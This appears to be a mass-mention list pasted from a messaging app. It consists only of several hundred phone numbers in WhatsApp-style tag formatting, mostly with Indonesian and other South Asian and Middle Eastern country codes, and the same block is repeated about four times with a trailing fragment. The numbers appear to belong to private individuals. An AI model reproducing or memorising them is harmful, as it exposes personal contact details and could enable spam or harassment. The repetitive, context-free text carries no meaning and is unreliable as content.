~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ 